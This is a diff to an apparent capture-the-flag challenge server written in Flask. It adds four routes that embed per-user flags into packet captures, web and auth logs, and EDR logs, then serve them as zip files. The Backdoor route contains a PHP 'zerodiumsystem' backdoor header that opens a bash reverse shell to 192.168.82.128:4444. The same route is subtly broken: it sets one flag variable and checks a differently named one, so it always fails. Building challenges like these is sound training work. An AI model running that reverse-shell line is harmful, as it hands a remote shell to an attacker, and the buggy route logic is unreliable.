@@ -2,6 +2,7 @@ from flask import Flask, request, jsonify, render_template, Response
 from flask_cors import CORS
 import requests
 import os
+import json
 import tempfile
 import subprocess
 import zipfile
@@ -11,7 +12,7 @@ import random
 import base64
 import pandas as pd
 from datetime import datetime, timedelta
-from scapy.all import IP, UDP, DNS, DNSQR, wrpcap, rdpcap, Raw
+from scapy.all import IP, UDP, DNS, DNSQR, wrpcap, rdpcap, Raw, TCP
 
 app = Flask(__name__)
 CORS(app)
@@ -27,6 +28,10 @@ chatgpt_challenge_id = "6841aacfc6d6c84d40c72da7"
 challenge_id = "682c3e5b088e4ef9fb77763f"
 procnet_challenge_id = "68402692c6d6c84d40c70bc0" 
 aiChallenge_id = "68414798c6d6c84d40c7247d" 
+backDoor_id = "6845bbe19d3ac335c86a30d2" 
+springBoot_id = "684679669d3ac335c86a44cf" 
+ShadowsInTheWeb_id = "6845f3779d3ac335c86a3176" 
+AiEvasion_id = "68467ad99d3ac335c86a4b1d" 
 
 # Path configurations for each challenge
 CHALLENGE_PATHS = {
@@ -53,7 +58,31 @@ CHALLENGE_PATHS = {
     'aichallenge': {
         'log_path': os.path.join(CHALLENGES_DIR, 'aichallenge', 'ai_detection_log.json'),
         'whitelist_path': os.path.join(CHALLENGES_DIR, 'aichallenge', 'corporate_whitelist.txt')
+    },
+    'Backdoor':{
+        'pcap_path': os.path.join(CHALLENGES_DIR, 'Backdoor', 'output.pcap'),
+         'log_file': os.path.join(CHALLENGES_DIR, 'Backdoor', 'access.log'),
+
+    },
+     'SpringBoot':{
+        'pcap_path': os.path.join(CHALLENGES_DIR, 'SpringBoot', 'output.pcap'),
+         'log_file': os.path.join(CHALLENGES_DIR, 'SpringBoot', 'access.log'),
+
+    },
+     'ShadowsInTheWeb':{
+        'access_file': os.path.join(CHALLENGES_DIR, 'ShadowsInTheWeb', 'access.log'),
+        'auth_file': os.path.join(CHALLENGES_DIR, 'ShadowsInTheWeb', 'auth.log'),
+        'error_file': os.path.join(CHALLENGES_DIR, 'ShadowsInTheWeb', 'error.log'),
+
+    },
+     'AiEvasion':{
+        'blocker_file': os.path.join(CHALLENGES_DIR, 'AiEvasion', 'blocker.py'),
+        'config_file': os.path.join(CHALLENGES_DIR, 'AiEvasion', 'config.json'),
+        'malware_file': os.path.join(CHALLENGES_DIR, 'AiEvasion', 'malware.js'),
+        'obfuscated_file': os.path.join(CHALLENGES_DIR, 'AiEvasion', 'obfuscated.js'),
+        'edrLog_file': os.path.join(CHALLENGES_DIR, 'AiEvasion', 'edr_logs.json'),
     }
+
 }
 
 # Common functions
@@ -484,6 +513,385 @@ def ai_challenge():
 
     except Exception as e:
         return jsonify({"error": "Processing failed", "details": str(e)}), 500
+
+
+@app.route('/backdoor', methods=['POST'])
+def backdoor_challenge():
+    data = request.json
+    token = data.get("token")
+
+    if not token:
+        return jsonify({"error": "Missing token"}), 400
+
+    try:
+        headers = {"Auth-token": token}
+        response = requests.get(
+            f"{CTF_BASE_URL}/api/challenges/get-flag/{backDoor_id}",
+            headers=headers
+        )
+
+        if response.status_code != 200:
+            return jsonify({"error": "Failed to get flag"}), response.status_code
+
+        flag_data = response.json()
+        flag = flag_data['flag']
+        username = flag_data['username']
+
+        # Validate flag format
+        if not flag.startswith("FLAG{") or not flag.endswith("}"):
+            return jsonify({"error": "Invalid flag format"}), 400
+
+        flag_content = flag[5:-1]
+        if '_' not in flag_content:
+            return jsonify({"error": "Flag missing underscore"}), 400
+
+        part_a, part_b = flag_content.split('_', 1)
+        packets = rdpcap(CHALLENGE_PATHS['Backdoor']['pcap_path'])
+
+        found_133336 = False
+        found_stream = False
+
+        # Modify packet 133336
+        pkt1 = packets[133335]
+        if pkt1.haslayer(Raw):
+            payload = pkt1[Raw].load
+            target = b'User-Agentt: zerodiumsystem("bash -c \'bash -i >& /dev/tcp/192.168.82.128/4444 0>&1\'");\r\n'
+            if target in payload:
+                new_payload = target[:-2] + part_a.encode() + b'\r\n'
+                pkt1[Raw].load = payload.replace(target, new_payload)
+                del pkt1[IP].len, pkt1[IP].chksum, pkt1[TCP].chksum
+                found_133333 = True
+
+        # Reassemble packets 134325 and 134326
+        pkt_stream = [packets[134324], packets[134325]]  # Wireshark numbers are +1
+        stream_payload = b''.join(pkt[Raw].load for pkt in pkt_stream if pkt.haslayer(Raw))
+
+        # Replace target inside stream
+        target_payload = b'secret+files+api+key=098ABCD12345!\n'
+        if target_payload in stream_payload:
+            modified_payload = stream_payload.replace(
+                target_payload,
+                b'secret+files+api+key=098ABCD12345!_' + part_b.encode() + b'\n'
+            )
+
+            # Update content-length
+            import re
+            match = re.search(b'Content-Length: (\\d+)', modified_payload)
+            if match:
+                old_len = int(match.group(1))
+                new_len = old_len + len(part_b.encode()) + 1
+                modified_payload = re.sub(
+                    b'Content-Length: \\d+',
+                    b'Content-Length: ' + str(new_len).encode(),
+                    modified_payload
+                )
+
+            # Now split modified payload across same two packets
+            len_1 = len(pkt_stream[0][Raw].load)
+            pkt_stream[0][Raw].load = modified_payload[:len_1]
+            pkt_stream[1][Raw].load = modified_payload[len_1:]
+
+            for pkt in pkt_stream:
+                del pkt[IP].len, pkt[IP].chksum, pkt[TCP].chksum
+
+            found_stream = True
+
+        if not found_133336 or not found_stream:
+            return jsonify({"error": "One or both target packets not modified"}), 400
+
+        # Write zip
+        temp_dir = tempfile.mkdtemp()
+        output_pcap = os.path.join(temp_dir, f"{username}.pcap")
+        log_path = CHALLENGE_PATHS['Backdoor']['log_file']
+        zip_path = os.path.join(temp_dir, f"{username}.zip")
+
+        wrpcap(output_pcap, packets)
+
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            zipf.write(output_pcap, arcname=f"{username}.pcap")
+            zipf.write(log_path, arcname="access.log")
+
+        def generate():
+            with open(zip_path, 'rb') as f:
+                while chunk := f.read(1024):
+                    yield chunk
+            shutil.rmtree(temp_dir)
+
+        return Response(
+            generate(),
+            mimetype='application/zip',
+            headers={'Content-Disposition': f'attachment; filename="{username}.zip"'}
+        )
+
+    except Exception as e:
+        return jsonify({"error": "Processing failed", "details": str(e)})
+    
+
+@app.route('/springboot', methods=['POST'])
+def springboot_challenge():
+    data = request.json
+    token = data.get("token")
+
+    if not token:
+        return jsonify({"error": "Missing token"}), 400
+
+    try:
+        headers = {"Auth-token": token}
+        response = requests.get(
+            f"{CTF_BASE_URL}/api/challenges/get-flag/{springBoot_id}",
+            headers=headers
+        )
+
+        if response.status_code != 200:
+            return jsonify({"error": "Failed to get flag"}), response.status_code
+
+        flag_data = response.json()
+        flag = flag_data['flag']
+        username = flag_data['username']
+
+        if not flag.startswith("FLAG{") or not flag.endswith("}"):
+            return jsonify({"error": "Invalid flag format"}), 400
+
+        flag_content = flag[5:-1]
+        if '_' not in flag_content:
+            return jsonify({"error": "Flag missing underscore"}), 400
+
+        part_a, part_b = flag_content.split('_', 1)
+        packets = rdpcap(CHALLENGE_PATHS['SpringBoot']['pcap_path'])
+
+        # Modify packet 126055 (frame index = 126054)
+        pkt_a = packets[126054]
+        found_a = False
+        if pkt_a.haslayer(Raw):
+            payload = pkt_a[Raw].load
+            target = b'Namedpandaapt12H4xor!'
+            if target in payload:
+                new_payload = payload.replace(
+                    target,
+                    target + part_a.encode()
+                )
+                pkt_a[Raw].load = new_payload
+                del pkt_a[IP].len, pkt_a[IP].chksum, pkt_a[TCP].chksum
+                found_a = True
+
+        # Modify packet 125814 (frame index = 125813)
+        pkt_b = packets[125813]
+        found_b = False
+        if pkt_b.haslayer(Raw):
+            payload = pkt_b[Raw].load
+            target = b'base64'
+            if target in payload:
+                new_payload = payload.replace(
+                    target,
+                    target + b'=='+b'_' + part_b.encode()
+                )
+                pkt_b[Raw].load = new_payload
+                del pkt_b[IP].len, pkt_b[IP].chksum, pkt_b[TCP].chksum
+                found_b = True
+
+        if not found_a or not found_b:
+            return jsonify({"error": "One or both target packets not modified"}), 400
+
+        # Create zip
+        temp_dir = tempfile.mkdtemp()
+        output_pcap = os.path.join(temp_dir, f"{username}.pcap")
+        log_path = CHALLENGE_PATHS['SpringBoot']['log_file']
+        zip_path = os.path.join(temp_dir, f"{username}.zip")
+
+        wrpcap(output_pcap, packets)
+
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            zipf.write(output_pcap, arcname=f"{username}.pcap")
+            zipf.write(log_path, arcname="access.log")
+
+        def generate():
+            with open(zip_path, 'rb') as f:
+                while chunk := f.read(1024):
+                    yield chunk
+            shutil.rmtree(temp_dir)
+
+        return Response(
+            generate(),
+            mimetype='application/zip',
+            headers={'Content-Disposition': f'attachment; filename="{username}.zip"'}
+        )
+
+    except Exception as e:
+        return jsonify({"error": "Processing failed", "details": str(e)})
+
+@app.route('/ShadowsInTheWeb', methods=['POST'])
+def shadows_in_the_web_challenge():
+    data = request.json
+    token = data.get("token")
+
+    if not token:
+        return jsonify({"error": "Missing token"}), 400
+
+    try:
+        headers = {"Auth-token": token}
+        response = requests.get(
+            f"{CTF_BASE_URL}/api/challenges/get-flag/{ShadowsInTheWeb_id}",
+            headers=headers
+        )
+
+        if response.status_code != 200:
+            return jsonify({"error": "Failed to get flag"}), response.status_code
+
+        flag_data = response.json()
+        flag = flag_data['flag']
+        username = flag_data['username']
+
+        if not flag.startswith("FLAG{") or not flag.endswith("}"):
+            return jsonify({"error": "Invalid flag format"}), 400
+
+        flag_content = flag[5:-1]
+        parts = flag_content.split('_')
+
+        if len(parts) != 3:
+            return jsonify({"error": "Flag format incorrect"}), 400
+
+        part_a = parts[0]
+        part_b = parts[2]
+
+        # File paths
+        access_path = CHALLENGE_PATHS['ShadowsInTheWeb']['access_file']
+        auth_path = CHALLENGE_PATHS['ShadowsInTheWeb']['auth_file']
+        error_path = CHALLENGE_PATHS['ShadowsInTheWeb']['error_file']
+
+        # Create temp directory
+        temp_dir = tempfile.mkdtemp()
+        access_out = os.path.join(temp_dir, "access.log")
+        auth_out = os.path.join(temp_dir, "auth.log")
+        error_out = os.path.join(temp_dir, "error.log")
+        zip_path = os.path.join(temp_dir, f"{username}.zip")
+
+        # Modify and write access.log
+        with open(access_path, 'r') as f_in, open(access_out, 'w') as f_out:
+            content = f_in.read()
+            content = content.replace("y738293.php", part_a)
+            f_out.write(content)
+
+        # Modify and write auth.log
+        with open(auth_path, 'r') as f_in, open(auth_out, 'w') as f_out:
+            content = f_in.read()
+            content = content.replace("203.0.113.77", part_b)
+            f_out.write(content)
+
+        # Copy error.log as-is
+        shutil.copy(error_path, error_out)
+
+        # Create zip
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            zipf.write(access_out, arcname="access.log")
+            zipf.write(auth_out, arcname="auth.log")
+            zipf.write(error_out, arcname="error.log")
+
+        def generate():
+            with open(zip_path, 'rb') as f:
+                while chunk := f.read(1024):
+                    yield chunk
+            shutil.rmtree(temp_dir)
+
+        return Response(
+            generate(),
+            mimetype='application/zip',
+            headers={'Content-Disposition': f'attachment; filename="{username}.zip"'}
+        )
+
+    except Exception as e:
+        return jsonify({"error": "Processing failed", "details": str(e)})
+
+
+@app.route('/AiEvasion', methods=['POST'])
+def ai_evasion_challenge():
+    data = request.json
+    token = data.get("token")
+
+    if not token:
+        return jsonify({"error": "Missing token"}), 400
+
+    try:
+        headers = {"Auth-token": token}
+        response = requests.get(
+            f"{CTF_BASE_URL}/api/challenges/get-flag/{AiEvasion_id}",
+            headers=headers
+        )
+
+        if response.status_code != 200:
+            return jsonify({"error": "Failed to get flag"}), response.status_code
+
+        flag_data = response.json()
+        flag = flag_data['flag']
+        username = flag_data['username']
+
+        if not flag.startswith("FLAG{") or not flag.endswith("}"):
+            return jsonify({"error": "Invalid flag format"}), 400
+
+        flag_content = flag[5:-1]
+        parts = flag_content.split('_')
+
+        if len(parts) < 2:
+            return jsonify({"error": "Flag format incorrect"}), 400
+
+        part_a = parts[0]  # only use partA
+
+        # Get paths
+        paths = CHALLENGE_PATHS['AiEvasion']
+        blocker_file = paths['blocker_file']
+        config_file = paths['config_file']
+        malware_file = paths['malware_file']
+        obfuscated_file = paths['obfuscated_file']
+        edr_file = paths['edrLog_file']
+
+        # Temp output paths
+        temp_dir = tempfile.mkdtemp()
+        out_blocker = os.path.join(temp_dir, "blocker.py")
+        out_config = os.path.join(temp_dir, "config.json")
+        out_malware = os.path.join(temp_dir, "malware.js")
+        out_obfuscated = os.path.join(temp_dir, "obfuscated.js")
+        out_edr = os.path.join(temp_dir, "edr_logs.json")
+        zip_path = os.path.join(temp_dir, f"{username}.zip")
+
+        # Copy unchanged files
+        shutil.copy(blocker_file, out_blocker)
+        shutil.copy(config_file, out_config)
+        shutil.copy(malware_file, out_malware)
+        shutil.copy(obfuscated_file, out_obfuscated)
+
+        # Process edr_logs.json
+        with open(edr_file, 'r') as f:
+            logs = json.load(f)
+
+        for entry in logs:
+            if entry.get("file_hash") == "8ebf0e8a7ef69e6557818e7b80708a330fd16ab709906492fa295996b6644db5":
+                entry["file_hash"] = part_a
+
+        with open(out_edr, 'w') as f:
+            json.dump(logs, f, indent=4)
+
+        # Zip all
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            zipf.write(out_blocker, arcname="blocker.py")
+            zipf.write(out_config, arcname="config.json")
+            zipf.write(out_malware, arcname="malware.js")
+            zipf.write(out_obfuscated, arcname="obfuscated.js")
+            zipf.write(out_edr, arcname="edr_logs.json")
+
+        def generate():
+            with open(zip_path, 'rb') as f:
+                while chunk := f.read(1024):
+                    yield chunk
+            shutil.rmtree(temp_dir)
+
+        return Response(
+            generate(),
+            mimetype='application/zip',
+            headers={'Content-Disposition': f'attachment; filename="{username}.zip"'}
+        )
+
+    except Exception as e:
+        return jsonify({"error": "Processing failed", "details": str(e)})
+
 
 if __name__ == '__main__':
     app.run(debug=True, port=5002)
